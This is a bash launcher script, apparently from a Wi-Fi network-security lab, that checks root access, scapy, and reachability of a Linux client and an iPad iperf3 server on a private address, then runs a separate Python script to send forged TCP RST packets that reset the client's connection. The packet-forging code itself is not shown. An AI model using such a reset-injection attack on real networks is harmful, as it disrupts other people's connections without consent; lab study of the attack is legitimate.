#!/usr/bin/env bash
set -uo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
PINK='\033[38;5;205m'
ORANGE='\033[38;5;208m'
RESET='\033[0m'

IPAD_IP="10.249.138.192"
IPAD_PORT=5201

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

STEP=0

step() {
    STEP=$((STEP+1))
    echo
    echo -e "${YELLOW}⦿ STEP $STEP: $1${RESET}"
}

ok() {
    echo -e "    ${GREEN}✓ OK:${RESET} $1"
}

fail() {
    echo -e "    ${RED}✗ FAILED:${RESET} $1"
    echo
    echo -e "${RED}Stopped at STEP $STEP.${RESET}"
    exit 1
}


CLIENT_PORT="${1:-}"
CLIENT_IP="${2:-}"

step "Checking arguments"

if [[ -z "$CLIENT_PORT" ]]; then
    fail "no client port given.

Usage:
    sudo ./run_attack1_wifi.sh <client_port> [client_ip]

The client port is printed by run_cs_wifi.sh.
If client_ip is omitted, it is auto-detected by sniffing traffic to the
iPad (make sure the iperf3 transfer is actively running)."
fi

if [[ -n "$CLIENT_IP" ]]; then
    ok "client IP   = $CLIENT_IP"
else
    ok "client IP   = auto-detect via sniffing"
fi

ok "client port = $CLIENT_PORT"
ok "iPad IP     = $IPAD_IP"
ok "iPad port   = $IPAD_PORT"


step "Checking root privileges"

if [[ $EUID -ne 0 ]]; then
    fail "must run as root:
sudo ./run_attack1_wifi.sh $CLIENT_PORT $CLIENT_IP"
fi

ok "running as root"


step "Checking python3"

if ! command -v python3 >/dev/null 2>&1; then
    fail "python3 not found."
fi

ok "python3 found"


step "Checking scapy"

if ! python3 -c "import scapy.all" >/dev/null 2>&1; then
    fail "scapy not installed for this python3."
fi

ok "scapy import OK"


if [[ -n "$CLIENT_IP" ]]; then
    step "Checking Linux client"

    if ! ping -c 2 -W 1 "$CLIENT_IP" >/dev/null 2>&1; then
        fail "$CLIENT_IP is unreachable."
    fi

    ok "$CLIENT_IP reachable"
fi


step "Checking iPad"

if ! ping -c 2 -W 1 "$IPAD_IP" >/dev/null 2>&1; then
    fail "$IPAD_IP is unreachable."
fi

ok "$IPAD_IP reachable"


step "Checking iPad TCP server on port $IPAD_PORT"

if ! nc -z -w 2 "$IPAD_IP" "$IPAD_PORT" >/dev/null 2>&1; then
    fail "iPad is reachable, but TCP port $IPAD_PORT is not accepting connections

Make sure iPerfman is running in SERVER mode on the iPad."
fi

ok "iPad is accepting TCP connections on $IPAD_PORT"

step "Launching attack1_reset_wifi.py"

echo -e "${PINK}⦿ Attack configuration:${RESET}"
echo "    Client IP   : ${CLIENT_IP:-auto-detect}"
echo "    Client port : $CLIENT_PORT"
echo "    iPad IP     : $IPAD_IP"
echo "    iPad port   : $IPAD_PORT"

echo
echo -e "${YELLOW}⦿ Sending forged RST packets...${RESET}"
echo

python3 "$SCRIPT_DIR/attack1_reset_wifi.py" \
    "$CLIENT_PORT" \
    "$CLIENT_IP" \
    "$IPAD_IP"

ATTACK_STATUS=$?

echo

if [[ $ATTACK_STATUS -ne 0 ]]; then
    fail "attack1_reset_wifi.py exited with status $ATTACK_STATUS."
fi

echo -e "${GREEN}⦿ attack1_reset_wifi.py finished successfully.${RESET}"